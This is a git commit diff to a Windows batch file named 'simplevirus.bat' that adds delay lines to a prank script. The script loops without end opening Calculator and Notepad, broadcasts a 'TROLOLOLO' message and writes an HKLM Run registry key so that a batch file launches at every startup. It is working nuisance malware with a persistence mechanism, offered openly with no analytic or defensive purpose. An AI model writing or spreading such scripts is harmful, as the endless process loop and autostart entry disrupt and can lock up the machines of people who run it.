ed6ed56d39576591802e4b7a78279d6d030fb38b
Decation2 <88938287+Decation2@users.noreply.github.com>
2022-04-11 19:27:30 +0500

    Update simplevirus.bat

--- simplevirus.bat
+++ simplevirus.bat
@@ -2,7 +2,9 @@
 cls
 :A
 start calc.exe
+ping localhost -n 3 >nul 
 start notepad.exe
+ping localhost -n 3 >nul 
 msg * "TROLOLOLOLOLOLOLOLOLO"
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /f /v Autoexec /t reg_sz /d "C:\Autoexec.bat"
 goto A
